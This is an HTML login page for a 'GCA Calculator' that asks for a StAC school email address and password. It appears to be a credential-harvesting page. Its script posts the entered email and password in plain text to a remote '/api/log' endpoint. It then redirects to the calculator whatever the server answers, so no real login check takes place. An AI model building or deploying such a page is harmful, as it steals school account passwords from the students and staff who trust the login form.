<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login | GCA Calculator</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background: linear-gradient(160deg, #0f172a 0%, #1e293b 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Inter", sans-serif;
      color: #f3f4f6;
    }
    .card {
      background: #161b22;
      padding: 32px;
      border-radius: 16px;
      text-align: center;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
    }
    input {
      width: 94%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 10px;
      border: 1px solid #2d3748;
      background: #0f172a;
      color: #f3f4f6;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #3b82f6;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 12px;
    
    }
    button:hover { background: #2563eb; }
  </style>
</head>
<body>

  <div class="card">
    <h1>Welcome to the GCA Calculator!</h1>
    <p>Please log in with your StAC account to access the calculator. This is to ensure it stays within StAC.</p>
<form id="loginForm">
  <input type="email" id="username" placeholder="Email" required>
  <div id="emailError" style="color: #f87171; font-size: 14px; display: none; margin-bottom: 8px;">
Login requires a valid StAC school email address
  </div>
  <input type="password" id="password" placeholder="Password" required>
  <button type="submit">Login</button>
</form>
  </div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const usernameInput = document.getElementById('username');
  const username = usernameInput.value.trim();
  const password = document.getElementById('password').value;
  const emailError = document.getElementById('emailError');

  // Reset previous error styles
  usernameInput.style.borderColor = '#2d3748';
  emailError.style.display = 'none';

  // Validate email domain
  if (!username.endsWith('@stacmail.net')) {
    usernameInput.style.borderColor = '#f87171'; // red border
    emailError.style.display = 'block'; // show message
    return; // stop submission
  }

  try {
    const res = await fetch("https://gca-calc.vercel.app/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    console.log("Server response:", data);

    setTimeout(() => {
      window.location.href = 'calculator.html';
    }, 200); 
  } catch (err) {
    console.error(err);
  }
});
</script>


</body>
</html>
